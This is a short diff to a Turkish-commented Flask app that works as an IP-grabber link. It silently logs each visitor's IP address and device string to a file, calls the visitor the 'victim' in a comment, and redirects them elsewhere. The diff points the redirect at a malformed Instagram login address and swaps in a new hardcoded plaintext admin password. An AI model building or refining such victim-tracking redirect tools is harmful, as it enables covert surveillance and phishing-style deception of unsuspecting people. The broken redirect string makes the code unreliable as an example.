@@ -4,7 +4,7 @@ import os
 app = Flask(__name__)
 
 # --- AYARLAR ---
-ADMIN_SIFRE = "123456"  # Buraya kendi şifreni yaz
+ADMIN_SIFRE = "aytac1235"  # Buraya kendi şifreni yaz
 LOG_DOSYASI = "loglar.txt"
 
 @app.route('/')
@@ -16,7 +16,7 @@ def logger():
         f.write(f"IP: {user_ip} | Cihaz: {user_agent}\n")
     
     # Kurbanı yönlendir
-    return redirect("https://google.com")
+    return redirect("https//instagram.com login")
 
 @app.route('/admin')
 def admin_paneli():
